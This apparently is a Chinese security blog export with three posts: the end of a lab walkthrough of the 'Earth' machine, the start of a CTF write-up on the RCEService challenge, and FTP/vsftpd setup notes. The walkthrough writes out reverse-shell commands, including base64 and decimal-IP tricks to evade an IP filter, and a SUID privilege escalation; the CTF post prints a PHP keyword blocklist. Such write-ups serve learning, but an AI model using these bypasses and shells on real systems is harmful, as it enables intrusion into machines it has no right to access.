<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="keyword">from</span> ipaddress </span><br><span class="line"><span class="keyword">import</span> ip_address <span class="keyword">from</span> django </span><br><span class="line"><span class="keyword">import</span> forms <span class="keyword">from</span> django.forms </span><br><span class="line"><span class="keyword">import</span> ModelForm <span class="keyword">from</span> django.core.exceptions </span><br><span class="line"><span class="keyword">import</span> ValidationError <span class="keyword">from</span> .models </span><br><span class="line"><span class="keyword">import</span> EncryptedMessage </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MessageForm</span>(<span class="params">ModelForm</span>):</span> </span><br><span class="line">	message_key = forms.CharField(max_length=<span class="number">50</span>) </span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span> </span><br><span class="line">	model = EncryptedMessage fields = [<span class="string">&#x27;message&#x27;</span>] </span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLICommandField</span>(<span class="params">forms.CharField</span>):</span> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">self, value</span>):</span> </span><br><span class="line">		<span class="built_in">super</span>().validate(value) </span><br><span class="line">		<span class="keyword">for</span> potential_ip <span class="keyword">in</span> re.findall(<span class="string">r&#x27;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&#x27;</span>, value): </span><br><span class="line">			<span class="keyword">try</span>: </span><br><span class="line">				ip_address(potential_ip) </span><br><span class="line">			<span class="keyword">except</span>: </span><br><span class="line">				<span class="keyword">pass</span> </span><br><span class="line">			<span class="keyword">else</span>: </span><br><span class="line">				<span class="keyword">raise</span> ValidationError(<span class="string">&#x27;Remote connections are forbidden.&#x27;</span>) </span><br><span class="line">				</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLIForm</span>(<span class="params">forms.Form</span>):</span> </span><br><span class="line">	cli_command = CLICommandField(label=<span class="string">&#x27;CLI command&#x27;</span>, max_length=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>从该文件中也可以看到就是过滤了ip的格式。</p>
<h1 id="get-shell">3. get shell</h1>
<h2 id="方法1">3.1. 方法1</h2>
<p>这里能够执行系统命令，因此直接使用下面的命令反弹shell:
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 10.0.2.4 3333</span><br></pre></td></tr></table></figure></p>
<p>但是好像经过了一定的过滤</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232342.png" /></p>
<p>我又尝试了往网页的目录写反弹shell的文件，也失败了。最后思考，应该是过滤了ip地址，导致无法执行反弹shell的命令，因此先将上面的命令base64编码
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~]</span><br><span class="line">└─$ echo &quot;nc -e /bin/bash 10.0.2.4 3333&quot; | base64 </span><br><span class="line">bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDMzMzMK</span><br></pre></td></tr></table></figure></p>
<p>然后执行如下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDMzMzMK&quot; | base64 -d| /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232726.png" /></p>
<h2 id="方法2">3.2. 方法2</h2>
<p>因为只过滤了ip，因此将ip换成其他进制表示，反弹shell的命令如下：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/167772676/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233221.png" /></p>
<blockquote>
<p>其实也可以使用nc，nc中的变量也支持其他进制显示 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518201819.png" /></p>
</blockquote>
<h1 id="权限提升">4. 权限提升</h1>
<p>获得shell之后经过所有的信息收集，发现不存在内核漏洞，sudo没密码，没有可疑进程，suid只有一个比较可疑的二进制文件：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233354.png" /></p>
<p>直接执行该文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHECKING IF RESET TRIGGERS PRESENT...</span><br><span class="line">RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span><br></pre></td></tr></table></figure></p>
<p>利用 <code>strings /usr/bin/reset_root</code>
命令查看，会发现这么一句话： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/echo &#x27;root:Earth&#x27; | /usr/sbin/chpasswd</span><br></pre></td></tr></table></figure></p>
<p>猜测，如果这个文件执行成功，就会修改root的密码。但是根据错误提示，还是缺少了
triggers。</p>
<p>将该文件利用nc传到kali，然后运行下面的命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ltrace ./reset_root</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234027.png" /></p>
<p>这是c语言的代码。二进制文件执行到这就退出了，并且三句 access
函数的结果都是 -1，猜测这就是
triggers，而<code>access(filename, 0)</code>的0表示是否存在这个文件，如果存在access返回0，否则返回-1</p>
<p>思路：在靶机上创建这三个文件： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. touch /dev/shm/kHgTFI5G</span><br><span class="line">2. touch /dev/shm/Zw7bV9U5</span><br><span class="line">3. touch /tmp/kcM0Wewe</span><br></pre></td></tr></table></figure></p>
<p>然后再执行该文件就成功了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234407.png" /></p>
<p>最后切换为root即可</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234433.png" /></p>
<p>读取flag收尾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root_flag.txt</span><br><span class="line"></span><br><span class="line">              _-o#&amp;&amp;*&#x27;&#x27;&#x27;&#x27;?d:&gt;b\_</span><br><span class="line">          _o/&quot;`&#x27;&#x27;  &#x27;&#x27;,, dMF9MMMMMHo_</span><br><span class="line">       .o&amp;#&#x27;        `&quot;MbHMMMMMMMMMMMHo.</span><br><span class="line">     .o&quot;&quot; &#x27;         vodM*$&amp;&amp;HMMMMMMMMMM?.</span><br><span class="line">    ,&#x27;              $M&amp;ood,~&#x27;`(&amp;##MMMMMMH\</span><br><span class="line">   /               ,MMMMMMM#b?#bobMMMMHMMML</span><br><span class="line">  &amp;              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk</span><br><span class="line"> ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L</span><br><span class="line">|               |MMMMMMMMMMMMMMMMMMMMbMH&#x27;   T,</span><br><span class="line">$H#:            `*MMMMMMMMMMMMMMMMMMMMb#&#125;&#x27;  `?</span><br><span class="line">]MMH#             &quot;&quot;*&quot;&quot;&quot;&quot;*#MMMMMMMMMMMMM&#x27;    -</span><br><span class="line">MMMMMb_                   |MMMMMMMMMMMP&#x27;     :</span><br><span class="line">HMMMMMMMHo                 `MMMMMMMMMT       .</span><br><span class="line">?MMMMMMMMP                  9MMMMMMMM&#125;       -</span><br><span class="line">-?MMMMMMM                  |MMMMMMMMM?,d-    &#x27;</span><br><span class="line"> :|MMMMMM-                 `MMMMMMMT .M|.   :</span><br><span class="line">  .9MMM[                    &amp;MMMMM*&#x27; `&#x27;    .</span><br><span class="line">   :9MMk                    `MMM#&quot;        -</span><br><span class="line">     &amp;M&#125;                     `          .-</span><br><span class="line">      `&amp;.                             .</span><br><span class="line">        `~,   .                     ./</span><br><span class="line">            . _                  .-</span><br><span class="line">              &#x27;`--._,dd###pp=&quot;&quot;&#x27;</span><br><span class="line"></span><br><span class="line">Congratulations on completing Earth!</span><br><span class="line">If you have any feedback please contact me at SirFlash@protonmail.com</span><br><span class="line">[root_flag_b0da9554d29db2117b02aa8b66ec492e]</span><br></pre></td></tr></table></figure>
<p>当然，也可以将该文件逆向成c文件。</p>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度适中，就是最后权限提升的时候没想到ltrace这个命令。涉及的攻击方法有：</p>
<ol type="1">
<li>加解密</li>
<li>RCE</li>
<li>反弹shell——base64绕过</li>
<li>反弹shell——ip进制转换绕过</li>
<li>跟踪进程调用库情况</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>suid提权</tag>
        <tag>RCE</tag>
        <tag>加解密</tag>
        <tag>反弹shell——base64绕过</tag>
        <tag>反弹shell——ip进制转换绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2019 RCEService</title>
    <url>/2022/05/06/FBCTF2019%20RCEService/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BFBCTF2019%5DRCEService">RCEService</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>本题不知道如何绕过，因此就去找源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>从源码中可以看到，该题过滤了许多关键词，并且本题还有两个坑。</p>
<p><strong>利用%0a换行绕过</strong>。这里遇到第一个坑，那就是需要两个换行符才能绕过，不知道为什么。</p>
<p>也就是构造`</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>FTP协议</title>
    <url>/2023/03/08/FTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>个人知识点记录。</p>
<span id="more"></span>
<h1 id="ftp-基础">1. FTP 基础</h1>
<blockquote>
<p>[[第 2 章 应用层#3. FTP]] 也有 FTP 基础，这里对其进行补充。</p>
</blockquote>
<h2 id="概述">1.1. 概述</h2>
<p>FTP（File Transfer Protocol）文件传输协议，在 TCP/IP
协议族中属于应用层协议运行于 TCP
协议之上是一种可靠的传输协议，主要功能用于实现用户间文件分发共享，以及网络管理者在进行设备版本升级、日志下载和配置保存等业务操作时，均会使用到
FTP 功能。</p>
<p><strong>FTP 实现的目标：</strong></p>
<ol type="1">
<li>促进文件的共享（计算机程序或数据）；</li>
<li>鼓励间接或者隐式的使用远程计算机；</li>
<li>向用户屏蔽不同主机中各种文件存储系统（<strong>File
system</strong>）的细节；</li>
<li>可靠和高效的传输数据</li>
</ol>
<p>同大多数 <code>Internet</code>
服务一样，<strong>FTP</strong>也是一个客户/服务器系统（<code>C/S</code>
系统）。用户通过一个客户端程序连接至在远程计算机上运行的服务器程序。依照<strong>FTP</strong>协议提供服务，进行文件传送的计算机就是<strong>FTP
服务器</strong>，而连接 FTP 服务器，遵循 FTP
协议与服务器传送文件的电脑就是<strong>FTP 客户端</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531140557.png" /></p>
<p>需要注意，与 HTTP 不同，FTP
还是一个<strong>有状态的协议</strong>，FTP
服务器需要维护用户的状态信息：当前所在路径，用户的账号以及对应的控制连接。</p>
<p>与 HTTP 相同的地方在于：</p>
<ul>
<li>两者都使用 TCP</li>
<li>FTP 在 <strong>控制连接</strong> 上也是以 ASCII 文本方式传送；</li>
</ul>
<h2 id="ftp-连接建立">1.2. FTP 连接建立</h2>
<p>与常见的应用层协议（比如 HTTP）不同，FTP 协议需要两条 TCP 连接：</p>
<ul>
<li>控制连接：用来传递控制信息，比如 FTP 命令之类的；</li>
<li>数据连接：用来传递数据；</li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/76af3d74dc814484bc80553cb959aadf%7Etplv-k3u1fbpfcp-zoom-in-crop-mark%204536%200%200%200.webp"
alt="76af3d74dc814484bc80553cb959aadf~tplv-k3u1fbpfcp-zoom-in-crop-mark 4536 0 0 0.webp" />
<figcaption
aria-hidden="true">76af3d74dc814484bc80553cb959aadf~tplv-k3u1fbpfcp-zoom-in-crop-mark
4536 0 0 0.webp</figcaption>
</figure>
<p>FTP
服务一般运行在20和21两个端口（服务器端）。端口20用于在客户端和服务器之间传输数据流（数据连接），而端口21用于传输控制流（控制连接），并且是命令通向
ftp 服务器的进口。</p>
<p>当数据通过数据流传输时，控制流处于空闲状态。而当控制流空闲很长时间后，客户端的防火墙会将其会话置为超时，这样当大量数据通过防火墙时，会产生一些问题。此时，虽然文件可以成功的传输，但因为控制会话，会被防火墙断开；传输会产生一些错误。</p>
<p>FTP 连接有两种建立方式：</p>
<ol type="1">
<li>主动模式（PORT）；</li>
<li>被动模式（PASV）；</li>
</ol>
<p>这里的主动和被动都是对于 FTP 服务端来说的。</p>
<h3 id="主动模式">1.2.1. 主动模式</h3>
<p>FTP 协议最初定义的连接方式，流程如下：</p>
<ol type="1">
<li>客户端的随机端口向服务端的 21 端口发起 TCP
建立，并建立控制连接；</li>
<li>客户端用 PORT
命令在控制连接上向服务器传输用于数据传输的临时端口号；</li>
<li>服务端的 20 端口向客户端的临时端口号发起 TCP
建立，并建立数据连接；</li>
<li>双方在数据连接上进行数据传输，传输完成之后发送数据的一方主动关闭数据连接；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308094030.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="被动模式">1.2.2. 被动模式</h3>
<p>流程如下：</p>
<ol type="1">
<li>客户端的随机端口向服务端的 21 端口发起 TCP
建立，并建立控制连接；</li>
<li>客户端在控制连接上向服务器发送 PASV
命令，告诉服务器进入被动模式，服务器选择临时端口号并通过控制连接告诉客户端；</li>
<li>客户端在有数据传输时，通过随机端口向服务器的临时端口发起 TCP
建立，并建立数据连接；</li>
<li>双方在数据连接上进行数据传输，传输完毕之后，发送数据的一方主动关闭数据连接；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308094334.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="连接方式总结">1.2.3. 连接方式总结</h3>
<p>主动模式对 FTP 服务器的管理是有利的，因为 FTP 服务器只需要管理 20、21
端口的数据出入（防火墙设置）；但对客户端的管理是不利的，因为服务器的 20
端口向客户端发起 TCP 建立时，有可能被客户端的防火墙拦截。</p>
<p>被动模式对 FTP 服务器的管理是不利的，因为客户端向服务器的临时端口发起
TCP
建立时，也有可能被防火墙拦截；但对客户端的管理是有利的，因为客户端主动去建立数据连接，端口的选择可控。</p>
<p>不论主动模式还是被动模式，对于控制连接的建立都是一样的，差别在于数据连接的建立。一言以蔽之，在数据连接建立时，谁主动，对谁有利。</p>
<h1 id="ftp-实战">2. FTP 实战</h1>
<p>服务器和客户端：Ubuntu 22.04。</p>
<h2 id="环境搭建与配置">2.1. 环境搭建与配置</h2>
<blockquote>
<p>环境的搭建与配置都是在服务器</p>
</blockquote>
<h3 id="下载与安装">2.1.1. 下载与安装</h3>
<p>首先，需要下载 <code>vsftpd</code>（very secure FTP daemon）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install vsftpd</span><br></pre></td></tr></table></figure>
<h3 id="修改配置文件">2.1.2. 修改配置文件</h3>
<p>下载完成之后，需要修改配置文件，配置文件的位置：<code>/etc/vsftpd.conf</code>
或者 <code>/etc/vsftpd/vsftpd.conf</code>，只贴一写重要的设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=YES</span><br><span class="line">write_enable=YES  # 是否允许用户上传</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br></pre></td></tr></table></figure>
<p>其中后面 3个很重要：</p>
<ul>
<li><code>chroot_local_user、chroot_list_enable、chroot_list_file</code>
是一起的，是否允许用户切换到上级目录。可以看下面的表格；</li>
</ul>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 43%" />
<col style="width: 43%" />
</colgroup>
<thead>
<tr class="header">
<th></th>
<th><code>chroot_local_user = YES</code></th>
<th><code>chroot_local_user = No</code></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>chroot_list_enable = YES</code></td>
<td>所有用户都不可以从家目录切换出去，如果设置了
<code>chroot_list_file</code>，则该文件下的用户可以切换出去</td>
<td>所有用户都可以从家目录切换出去，如果设置了
<code>chroot_list_file</code>，则该文件下的用户不可以切换出去</td>
</tr>
<tr class="even">
<td><code>chroot_list_enable = NO</code></td>
<td>所有用户都不可以从家目录切换出去，<code>chroot_list_file</code>
设置失效</td>
<td>所有用户都可以从家目录切换出去，<code>chroot_list_file</code>
设置失效</td>
</tr>
</tbody>
</table>
<p>修改完成之后，使用命令 <code>service vsftpd restart</code> 重启 FTP
服务使其生效。</p>
<p>打开了 <code>chroot_list_enable</code>
可能连接的时候提示连接不上，因为 <code>/etc/vsftpd.chroot_list</code>
不存在还是什么的，可以参考 [[#4. 参考]]第 9
篇文章，自己创建一个文件即可，名字只需要与配置文件中的相同就行。</p>
<h3 id="修改防火墙">2.1.3. 修改防火墙</h3>
<ul>
<li>如果正在运行 UFW 防火墙，需要允许 FTP 流量。打开 FTP 命令端口21，FTP
数据端口20和被动端口范围30000-31000；</li>
<li>为了避免被锁定，确保 SSH 打开端口 22；（其实无所谓）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sudo ufw allow 20:21/tcp</span><br><span class="line">2. sudo ufw allow 30000:31000/tcp</span><br><span class="line">3. sudo ufw allow ssh</span><br><span class="line">4. sudo ufw reload</span><br></pre></td></tr></table></figure>
<h2 id="一些问题与解决">2.2. 一些问题与解决</h2>
<h3 id="用户无法登录">2.2.1. 用户无法登录</h3>
<p>配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot_local_user=YES</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br></pre></td></tr></table></figure>
<p>有一个用户 <code>ftpers</code>，不在
<code>/etc/vsftpd.chroot_list</code> 文件中，使用该用户登录
<code>ftp</code> 时提示如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">500 OOPS: vsftpd: refusing to run with writable root inside chroot()</span><br></pre></td></tr></table></figure>
<p>解决问题的文章在 [[#4. 参考]]的第 12
篇文章，这里贴一下原文中说的原因：</p>
<blockquote>
<p>This is caused by the fact that the directory of the user you’re
connecting to, is write-enabled. In normal <code>chroot()</code>
situations, the parent directory needs to be read-only.</p>
</blockquote>
<blockquote>
<p>This means for most situations of <code>useradd</code>, which will
create a home directory owned and writeable by the user, the above error
of “<em>vsftpd: refusing to run with writable root inside chroot
()</em>” will be shown.</p>
</blockquote>
<p>解决办法就是在配置文件中加入这么一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_writeable_chroot=YES</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我对 <code>chroot</code> 不太了解，有机会补充一下。</p>
</blockquote>
<h3 id="登录之后命令无法执行">2.2.2. 登录之后命令无法执行</h3>
<p>问题如下；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308120201.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>输入任何命令都是显示
<code>229 Entering Extended Passive Mode</code>，解决问题的视频 [[#4.
参考]] 第 8 篇。</p>
<p>就是先输入命令 <code>passive</code>
退出被动模式，然后就可以执行命令了</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308120335.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>或者修改服务器配置文件，支持被动模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pasv_enable=YES  # 开启被动模式</span><br><span class="line">pasv_min_port=40001 #最低端口</span><br><span class="line">pasv_max_port=40010 #最高端口</span><br></pre></td></tr></table></figure>
<h2 id="ftp-使用">2.3. FTP 使用</h2>
<h3 id="基础用法">2.3.1. 基础用法</h3>
<p>一些常用的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ftp serverIP # 从shell登录到ftp服务器;</span><br><span class="line">2. user  # 登录，当已经进入 ftp 之后使用 user 可以登录</span><br><span class="line">3. get file  # 下载ftp服务器上的文件</span><br><span class="line">4. mget      # 下载多个文件</span><br><span class="line">5. put file  # 上传本地文件到ftp服务器</span><br><span class="line">6. mput      # 上传多个本地文件</span><br><span class="line">7. cd   # 切换目录</span><br><span class="line">8. ls   # 展示目录下的内容</span><br><span class="line">9. bye  # 断开连接</span><br><span class="line">10. ascii 或者 binary  # 切换传输模式</span><br><span class="line">11. pwd  # 显示当前目录</span><br><span class="line">12. exit 或者 quit  # 退出ftp</span><br></pre></td></tr></table></figure>
<p>登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">takagi@takagi-VirtualBox:~/Desktop$ ftp ftpers@10.0.2.15</span><br><span class="line">Connected to 10.0.2.15.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; user</span><br><span class="line">(username) ftpers</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>
<p>下载文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">200 EPRT <span class="built_in">command</span> successful. Consider using EPSV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1001     1001            6 Mar 08 11:44 test.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get test.txt</span><br><span class="line"><span class="built_in">local</span>: test.txt remote: test.txt</span><br><span class="line">200 EPRT <span class="built_in">command</span> successful. Consider using EPSV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> test.txt (6 bytes).</span><br><span class="line">100% |***********************************|     6        8.52 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">6 bytes received <span class="keyword">in</span> 00:00 (3.44 KiB/s)</span><br></pre></td></tr></table></figure>
<p>会下载到当前 shell 所在的目录下。</p>
<p>上传文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; put up.txt </span><br><span class="line"><span class="built_in">local</span>: up.txt remote: up.txt</span><br><span class="line">200 EPRT <span class="built_in">command</span> successful. Consider using EPSV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |***********************************|    12       18.99 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">12 bytes sent <span class="keyword">in</span> 00:00 (5.49 KiB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 EPRT <span class="built_in">command</span> successful. Consider using EPSV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1001     1001            6 Mar 08 11:44 test.txt</span><br><span class="line">-rw-------    1 1001     1001           12 Mar 08 12:15 up.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
<p>可以看到，多了一个 <code>up.txt</code> 文件。</p>
<h3 id="匿名登录">2.3.2. 匿名登录</h3>
<p>为什么要有匿名登录？</p>
<ul>
<li>因为有的服务器专门使用 FTP
来共享文件，而客户很多，不可能为每个客户都创建一个用户来登录 FTP
服务器，所以才有了匿名登录；</li>
</ul>
<p>修改配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anonymous_enable=YES  # 启动匿名登录</span><br><span class="line">anon_root=/var/ftp    # 设定匿名用户的根目录</span><br><span class="line">anon_upload_enable=YES  # 是否允许上传文件</span><br><span class="line">anon_mkdir_write_enable=YES  # 是否允许新建目录</span><br></pre></td></tr></table></figure>
<p>创建匿名用户的根目录
<code>/var/ftp</code>（名字、路径无所谓，只要和配置文件相同就行），在
<code>/var/ftp</code> 目录下新建一个目录
<code>pub</code>（名字无所谓，用处后面说）。</p>
<p>然后重启 <code>vsftpd</code> 服务就可以了。</p>
<p>匿名登录，用户名一般为 anonymous，密码一般是空，直接回车就行。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308122033.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">takagi@takagi-VirtualBox:~/Desktop$ ftp anonymous@10.0.2.15</span><br><span class="line">Connected to 10.0.2.15.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||30381|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Mar 08 16:01 pub</span><br><span class="line">-rw-r--r--    1 0        0             493 Mar 08 15:56 qwe.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get qwe.txt</span><br><span class="line"><span class="built_in">local</span>: qwe.txt remote: qwe.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||30110|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> qwe.txt (493 bytes).</span><br><span class="line">100% |***********************************|   493       10.22 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">493 bytes received <span class="keyword">in</span> 00:00 (412.19 KiB/s)</span><br><span class="line">ftp&gt; put up.txt</span><br><span class="line"><span class="built_in">local</span>: up.txt remote: up.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||30658|)</span><br><span class="line">553 Could not create file.</span><br></pre></td></tr></table></figure>
<p>从上面的信息可以看出匿名用户只可以下载文件，而不可以上传文件。这是因为上传文件需要对当前目录有
<code>w</code> 权限，我们查看 <code>/var/ftp</code>
发现并没有写权限：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308160741.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>或许有一个很简单的方式：直接将该目录的权限设置为 777
就好了，但实际是不行的，因为 vsftpd 处于安全考虑，是不准让 ftp
用户的家目录的权限是完全没有限制的。不过可以尝试一下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308160917.png"
alt="image.png" />
